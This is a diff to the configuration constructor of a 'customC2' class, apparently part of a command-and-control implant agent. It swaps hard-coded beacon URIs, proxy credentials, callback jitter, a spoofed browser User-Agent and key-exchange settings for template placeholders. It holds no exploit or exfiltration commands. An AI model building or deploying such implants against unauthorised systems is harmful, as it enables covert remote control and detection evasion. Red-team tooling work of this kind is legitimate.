@@ -2312,13 +2312,13 @@ class customC2 extends baseC2{
 		}
 		this.commands = [];
 		this.url = this.baseurl;
-		this.getURI = "index";
-		this.postURI = "data";
-		this.queryPathName = "q";
-		this.proxyURL = "";
-		this.proxyPort = "";
-		this.proxyUser = "";
-		this.proxyPassword = "";
+		this.getURI = "get_uri";
+		this.postURI = "post_uri";
+		this.queryPathName = "query_path_name";
+		this.proxyURL = "proxy_host";
+		this.proxyPort = "proxy_port";
+		this.proxyUser = "proxy_user";
+		this.proxyPassword = "proxy_pass";
 		this.proxy_dict = {};
 		if(this.proxyURL !== ""){
 			if(this.proxyURL.includes("https")) {
@@ -2337,13 +2337,13 @@ class customC2 extends baseC2{
 		if(this.proxyPassword !== ""){
 			this.proxy_dict["kCFProxyPasswordKey"] = this.proxyPassword;
 		}
-		this.jitter = 23;
-		this.header_list = [{"name": "User-Agent", "key": "User-Agent", "value": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"}];
+		this.jitter = callback_jitter;
+		this.header_list = headers_list;
 		this.aes_psk = "AESPSK"; // base64 encoded key
 		if(this.aes_psk !== ""){
             this.cryptokey = base64ToByteArray(this.aes_psk);
 		}
-        this.using_key_exchange = "T" === "T";
+        this.using_key_exchange = "encrypted_exchange_check" === "T";
 		this.exchanging_keys = this.using_key_exchange;
 		this.kill_date = new Date("killdate");
 	}
